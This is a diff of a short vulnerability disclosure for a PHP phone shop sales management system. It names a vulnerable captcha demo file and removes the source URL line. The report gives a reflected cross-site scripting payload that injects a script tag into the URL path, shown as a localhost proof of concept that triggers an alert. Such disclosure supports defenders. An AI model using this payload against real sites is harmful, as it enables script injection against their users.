@@ -2,8 +2,6 @@
 
 BUG_Author: Blair
 
-Source code website address：https://www.sourcecodester.com/php/10882/phone-shop-sales-managements-system.html
-
 Vulnerability File: /osms/assets/plugins/jquery-validation-1.11.1/demo/captcha/index.php
 
 Payload1:http://localhost/osms/assets/plugins/jquery-validation-1.11.1/demo/captcha/index.php/"><script>alert(1111)</script>?captcha=1&submit=Check
